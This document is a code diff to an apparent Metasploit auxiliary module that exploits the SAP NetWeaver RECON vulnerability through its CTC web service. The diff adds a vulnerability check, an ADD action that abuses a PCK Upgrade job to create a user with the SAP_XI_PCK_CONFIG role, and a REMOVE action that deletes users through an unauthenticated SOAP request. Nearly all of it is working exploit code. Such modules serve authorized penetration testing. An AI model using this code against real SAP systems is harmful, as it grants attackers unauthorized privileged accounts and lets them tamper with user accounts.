@@ -31,6 +31,11 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'AKA' => [ 'RECON' ]
         },
+        'Actions' => [
+          [ 'ADD', { 'Description' => 'Add the specified user' } ],
+          [ 'REMOVE', { 'Description' => 'Remove the specified user' } ]
+        ],
+        'DefaultAction' => 'ADD',
         'DisclosureDate' => '2020-07-14'
       )
     )
@@ -46,7 +51,35 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
+  def check
+    res = send_request_cgi(
+      {
+        'uri' => normalize_uri(target_uri.path),
+        'method' => 'GET',
+        'vars_get' => { 'wsdl' => '' }
+      }
+    )
+
+    return Exploit::CheckCode::Safe unless res&.code == 200
+    return Exploit::CheckCode::Safe unless res.headers['Content-Type'].strip.start_with?('text/xml')
+
+    xml = res.get_xml_document
+    return Exploit::CheckCode::Safe unless xml.namespaces['xmlns:wsdl'] == 'http://schemas.xmlsoap.org/wsdl/'
+    return Exploit::CheckCode::Safe if xml.xpath("//wsdl:definitions/wsdl:service[@name='CTCWebService']").empty?
+
+    Exploit::CheckCode::Vulnerable
+  end
+
   def run
+    case action.name
+    when 'ADD'
+      action_add
+    when 'REMOVE'
+      action_remove
+    end
+  end
+
+  def action_add
     job = nil
     print_status('Starting the PCK Upgrade job...')
     job = invoke_pckupgrade
@@ -81,8 +114,15 @@ class MetasploitModule < Msf::Auxiliary
         vprint_status("Received event description: #{description}")
       end
 
-      unless (description = event.xpath('//ctc:FinishAction/ctc:Action/ctc:Description/text()')).blank?
-        break if description.to_s =~ /Assign Role SAP_XI_PCK_CONFIG to PCKUser/i
+      unless (description = event.xpath('//ctc:FinishAction/ctc:Action/ctc:Description/text()')).blank? # rubocop:disable Style/Next
+        if description.to_s =~ /Create User PCKUser/i
+          print_good('Successfully created the user account')
+        end
+
+        if description.to_s =~ /Assign Role SAP_XI_PCK_CONFIG to PCKUser/i
+          print_good('Successfully added the role to the new user')
+          break
+        end
       end
     end
   ensure
@@ -90,6 +130,38 @@ class MetasploitModule < Msf::Auxiliary
       print_status('Canceling the PCK Upgrade job...')
       job.cancel_execution
     end
+  end
+
+  def action_remove
+    message = { name: 'DeleteUser' }
+    message[:data] = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+      <root>
+        <username secure="true">#{datastore['USERNAME'].encode(xml: :text)}</username>
+      </root>
+    ENVELOPE
+
+    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
+        <soapenv:Header/>
+        <soapenv:Body>
+          <urn:executeSynchronious>
+              <identifier>
+                <component>sap.com/tc~lm~config~content</component>
+                <path>content/Netweaver/ASJava/NWA/SPC/SPC_DeleteUser.cproc</path>
+             </identifier>
+             <contextMessages>
+                <baData>#{Rex::Text.encode_base64(message[:data])}</baData>
+                <name>#{message[:name]}</name>
+             </contextMessages>
+          </urn:executeSynchronious>
+         </soapenv:Body>
+      </soapenv:Envelope>
+    ENVELOPE
+
+    res = send_request_soap(envelope)
+    fail_with(Failure::UnexpectedReply, 'Failed to delete the user') unless res&.code == 200
+
+    print_good('Successfully deleted the user account')
   end
 
   def report_error_details(job)
